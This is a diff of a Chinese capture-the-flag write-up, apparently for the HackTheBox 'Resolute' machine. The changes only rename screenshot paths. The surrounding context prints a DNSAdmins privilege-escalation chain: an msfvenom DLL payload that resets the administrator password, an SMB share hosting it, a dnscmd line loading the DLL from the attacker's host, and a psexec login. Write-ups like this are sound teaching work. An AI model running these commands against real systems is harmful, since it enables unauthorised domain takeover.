@@ -155,7 +155,7 @@ dir -force
 
 * 在ryan账户下，发现了一个note.txt文档，像是一个备忘录之类的文档，没看出什么实际作用：
 
-<figure><img src="../../.gitbook/assets/32.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/32 (1).png" alt=""><figcaption></figcaption></figure>
 
 ### ROOT
 
@@ -166,14 +166,14 @@ dir -force
 msfvenom -p windows/x64/exec cmd='net user administrator fiii123 /domain' -f dll > resolute.dll
 ```
 
-<figure><img src="../../.gitbook/assets/33.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/33 (1).png" alt=""><figcaption></figcaption></figure>
 
 ```bash
 # 开启smbserver:
 python3 smbserver.py share ./
 ```
 
-<figure><img src="../../.gitbook/assets/35.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/35 (1).png" alt=""><figcaption></figcaption></figure>
 
 * 在目标系统上下载这个DLL文件，重启一下DNS服务，该DLL文件即可生效：
 
@@ -181,13 +181,13 @@ python3 smbserver.py share ./
 cmd /c dnscmd localhost /config /serverlevelplugindll \10.10.16.12\share\resolute.dll
 ```
 
-<figure><img src="../../.gitbook/assets/34.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/34 (1).png" alt=""><figcaption></figcaption></figure>
 
 * 使用psexec.py和刚才自定义的新的administrator的密码登录后，成功ROOT：
 
-<figure><img src="../../.gitbook/assets/36 (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/36 (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/37 (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/37 (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="info" %}
 本例Get Shell阶段不难，常规的信息收集之后就能拿到。提权阶段涉及到了我的盲点，第一次遇到DNSadmins提权，查阅了一些提示和技术解析的文章后，成功root。
